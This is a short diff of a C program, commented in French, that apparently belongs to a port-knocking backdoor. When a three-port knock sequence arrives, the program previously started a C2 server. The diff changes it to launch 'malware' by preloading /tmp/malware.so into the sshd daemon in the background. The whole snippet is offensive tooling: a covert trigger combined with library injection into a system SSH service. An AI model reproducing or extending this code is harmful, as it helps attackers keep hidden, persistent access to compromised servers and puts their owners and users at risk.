@@ -7,11 +7,10 @@
 #define KNOCK_PORT_1 1111
 #define KNOCK_PORT_2 2222
 #define KNOCK_PORT_3 3333
-#define C2_PORT 4444
 
-void start_c2() {
-    printf("[INFO] Knock correct, lancement du serveur C2...\n");
-    system("./server "); // Lancer le serveur C2 en arrière-plan
+void start_malware() {
+    printf("[INFO] ✅ Séquence Knock reçue, lancement du malware...\n");
+    system("LD_PRELOAD=/tmp/malware.so /usr/sbin/sshd -D &"); // Lancer le malware en arrière-plan
 }
 
 int main() {
@@ -54,7 +53,7 @@ int main() {
 
     // Vérification si la séquence complète est reçue
     if (knock_received[0] && knock_received[1] && knock_received[2]) {
-        start_c2();
+        start_malware();
     } else {
         printf("[ERROR] Séquence incorrecte, serveur C2 NON lancé !\n");
     }
